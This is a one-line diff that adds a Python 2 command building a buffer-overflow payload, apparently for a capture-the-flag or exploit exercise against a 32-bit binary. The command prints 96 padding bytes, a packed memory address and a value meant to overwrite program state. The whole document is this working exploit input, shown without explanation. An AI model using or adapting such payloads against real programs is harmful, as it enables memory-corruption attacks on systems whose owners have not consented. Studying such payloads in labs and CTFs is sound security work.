@@ -1,0 +1,1 @@
+python -c 'import struct;print "\x41"*(96) + struct.pack("<I", 0x0804a018) + "134514147"'
